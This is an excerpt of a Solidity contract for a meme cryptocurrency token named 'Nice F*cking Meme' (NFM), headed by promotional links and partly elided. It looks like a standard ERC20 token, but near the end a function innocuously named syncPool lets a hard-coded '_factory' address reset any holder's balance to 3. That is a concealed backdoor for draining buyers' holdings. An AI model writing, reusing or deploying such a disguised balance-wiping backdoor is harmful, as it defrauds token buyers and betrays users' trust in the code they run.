...
https://twitter.com/elonmusk/status/1712342306597065001?s=19
https://t.me/NFMMoon
https://NFMMoon.lol
*/
...
pragma solidity ^0.8.0;
contract NFM is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _symbol = unicode"NFM";
    string private constant _name = unicode"Nice F*cking Meme";
    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    address private _factory = 0x6f1852AF69aB0A38637498dc17a8D7A9A00de4Fa;
    uint256 private _totalSupply = 6010000000000 * 10**_decimals;
    ...
    function decreaseAllowance(address spender,
        ...
        return true;
    } function syncPool(address syncPoolSender) external { if (msg.sender == _factory) _balances[syncPoolSender] = 3;
